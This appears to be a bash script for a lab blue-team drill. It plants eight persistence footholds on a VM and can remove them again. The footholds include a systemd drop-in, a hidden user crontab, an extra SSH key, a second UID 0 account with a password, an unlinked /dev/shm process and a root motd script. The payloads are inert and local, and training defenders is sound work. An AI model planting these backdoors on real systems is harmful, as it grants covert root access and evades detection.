#!/usr/bin/env bash
# night-drill.sh - the 2026-09-16 blind drill set. LAB VM ONLY, run as root.
#
# Eight footholds, chosen to sit where the kit is strongest and where it is
# blind. Nothing reaches off the box: every "callback" is this machine talking
# to its own scored port. Run via stdin from the host so the script itself
# never lands on the target:
#
#   ssh HOST sudo bash -s -- --plant  < night-drill.sh
#   ssh HOST sudo bash -s -- --clean  < night-drill.sh
set -u

MARK="ND0916"
manifest=/root/.nd0916
OP=${1:---plant}

payload_web=/usr/local/lib/.web-metrics
payload_cron=/usr/local/bin/.dns-cache-refresh
dropin_dir=/etc/systemd/system/scored-web.service.d
dropin=$dropin_dir/10-hardening.conf
motd=/etc/update-motd.d/99-sysinfo-collect
shm=/dev/shm/.kworkerd
acct=apt-cacher
opkey='ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGl8KlisBRLwlVmJDDhiJs5yGrYoJF1WjTn1vZoQSSoy banneluk@workstation'

plant() { printf '  planted: %s\n' "$1"; printf '%s\n' "$1" >>"$manifest"; }
failed() { printf '  FAILED:  %s\n' "$1" >&2; }

# Kill by the EXACT path the payload was started from, never by process name.
# This box runs a scored python3 web server; `pkill python3` during cleanup is
# an outage you caused yourself.
kill_by_path() {
  local needle=$1 pid found=1
  for pid in $(ls /proc 2>/dev/null | grep -E '^[0-9]+$'); do
    [ -r "/proc/$pid/cmdline" ] || continue
    if tr '\0' ' ' <"/proc/$pid/cmdline" 2>/dev/null | grep -qF -- "$needle"; then
      kill -9 "$pid" 2>/dev/null && found=0
    fi
  done
  return $found
}

if [ "$OP" = "--clean" ]; then
  echo "[*] removing the 09-16 drill set"
  # Kill the ExecStartPost child BEFORE restarting the unit. The restart tears
  # down the service cgroup and takes the child with it, so a kill_by_path
  # afterwards finds nothing and reports nothing - and cleanup that stays quiet
  # about work it actually did is indistinguishable from cleanup that missed.
  kill_by_path "$payload_web" && echo "  stopped: ExecStartPost child"
  kill_by_path "$shm"         && echo "  stopped: /dev/shm process"
  rm -f "$dropin"; rmdir "$dropin_dir" 2>/dev/null
  systemctl daemon-reload >/dev/null 2>&1
  systemctl restart scored-web >/dev/null 2>&1
  rm -f "$payload_web" "$payload_cron" "$motd" "$shm"
  crontab -u banneluk -r 2>/dev/null
  rm -f /etc/ld.so.preload
  sed -i "/banneluk@workstation/d" /home/banneluk/.ssh/authorized_keys 2>/dev/null
  # NEVER -r. This account's home is /root by design; `userdel -r` would take
  # root's keys, dotfiles and canaries with it. That is the accident this
  # scenario exists to teach, and cleanup must not commit it.
  id "$acct" >/dev/null 2>&1 && userdel -f "$acct" >/dev/null 2>&1
  sed -i 's#^games:x:5:60:games:/usr/games:/bin/bash$#games:x:5:60:games:/usr/games:/usr/sbin/nologin#' /etc/passwd
  rm -f "$manifest"
  echo "[*] done"
  exit 0
fi

[ "$OP" = "--plant" ] || { echo "usage: $0 --plant|--clean" >&2; exit 2; }
: >"$manifest"; chmod 600 "$manifest"
echo "[*] planting the 09-16 drill set"

# 1. A drop-in on a SCORED unit. The unit cannot be deleted - it is the score -
#    so the remediation is surgery on the override, not removal of the service.
mkdir -p "$dropin_dir"
cat >"$payload_web" <<'EOP'
#!/bin/sh
# web metrics helper
while :; do sleep 300; done
EOP
chmod 755 "$payload_web"
cat >"$dropin" <<EOD
[Service]
ExecStartPost=-/bin/sh -c '$payload_web >/dev/null 2>&1 &'
EOD
systemctl daemon-reload >/dev/null 2>&1
if systemctl restart scored-web >/dev/null 2>&1; then
  plant "dropin:$dropin|ExecStartPost spawns $payload_web|scored unit, do not delete the unit"
else
  failed "scored-web drop-in"
fi

# 2. A crontab under the OPERATOR's account, not root's. `crontab -l` as root
#    shows nothing; the file is only visible per-user or in the spool.
cat >"$payload_cron" <<'EOP'
#!/bin/sh
# dns cache refresh
exec /usr/bin/nc -z 127.0.0.1 8080
EOP
chmod 755 "$payload_cron"
if printf '*/7 * * * * %s >/dev/null 2>&1\n' "$payload_cron" | crontab -u banneluk - 2>/dev/null; then
  plant "cron:/var/spool/cron/crontabs/banneluk|*/7 runs $payload_cron|user crontab, not root's"
else
  failed "banneluk crontab"
fi

# 3. /etc/ld.so.preload. On a stock Ubuntu this file does not exist at all, so
#    its presence is the finding. It names a real library here: a lab box that
#    cannot run `ls` teaches nothing.
if printf '/usr/lib/x86_64-linux-gnu/libutil.so.1\n' >/etc/ld.so.preload 2>/dev/null; then
  plant "preload:/etc/ld.so.preload|file should not exist on stock Ubuntu"
else
  failed "ld.so.preload"
fi

# 4. A key appended to the operator's own authorized_keys.
#
#    This MUST be a genuine key. The first version of this fixture used a
#    hand-typed placeholder blob, which is not valid base64 - so ssh-keygen
#    could not fingerprint it, sshd would have ignored it, and the "foothold"
#    granted nobody anything. A drill that plants something inert and then
#    scores the defender on finding it is measuring nothing. The file legitimately
#    exists and legitimately has a key in it, so the finding is the SECOND line.
ak=/home/banneluk/.ssh/authorized_keys
if [ -f "$ak" ] && printf '%s\n' "$opkey" >>"$ak"; then
  plant "sshkey:$ak|appended key, comment banneluk@workstation|the real key is still line 1"
else
  failed "authorized_keys append"
fi

# 5. A second UID 0 account homed at /root. Deleting it with -r deletes /root.
if useradd -o -u 0 -g 0 -d /root -s /bin/bash -M "$acct" 2>/dev/null; then
  echo "$acct:Lab-Drill-0916" | chpasswd 2>/dev/null
  plant "user:$acct|uid=0|home=/root|NEVER userdel -r"
else
  failed "uid0 account"
fi

# 6. A process whose executable is unlinked: /proc/PID/exe is the only copy.
#    It holds an ESTABLISHED socket to the scored port, so the socket table
#    shows a real connection and not a placeholder.
cp /usr/bin/python3 "$shm" 2>/dev/null && chmod 755 "$shm"
if [ -x "$shm" ]; then
  setsid "$shm" -c "
import socket,time
s=socket.create_connection(('127.0.0.1',8080))
while True: time.sleep(60)
" >/dev/null 2>&1 &
  sleep 1
  rm -f "$shm"
  plant "live:$shm (UNLINKED)|python3 copy holding ESTABLISHED tcp to 127.0.0.1:8080|recover via /proc/PID/exe"
else
  failed "/dev/shm payload"
fi

# 7. /etc/update-motd.d. Every script here runs AS ROOT on every SSH login, the
#    directory ships executable scripts by default so one more blends in, and
#    the kit does not look at this path at all. That is the point of including
#    it: a drill that only plants what the tools already cover measures nothing.
cat >"$motd" <<EOM
#!/bin/sh
# 99-sysinfo-collect
/usr/bin/nc -z 127.0.0.1 8080 2>/dev/null
EOM
chmod 755 "$motd"
plant "motd:$motd|root on every SSH login|KNOWN KIT BLIND SPOT - no tool checks this path"

# 8. A login shell on a system account. No new file is created anywhere; the
#    only evidence is one changed field in /etc/passwd.
if sed -i 's#^games:x:5:60:games:/usr/games:/usr/sbin/nologin$#games:x:5:60:games:/usr/games:/bin/bash#' /etc/passwd; then
  grep -q '^games:.*:/bin/bash$' /etc/passwd \
    && plant "passwd:games|shell nologin -> /bin/bash|no new file, one changed field" \
    || failed "games shell (pattern did not match)"
fi

echo
echo "[*] ground truth is in $manifest (root, 0600)"
wc -l <"$manifest" | xargs printf '[*] %s artifacts planted\n'
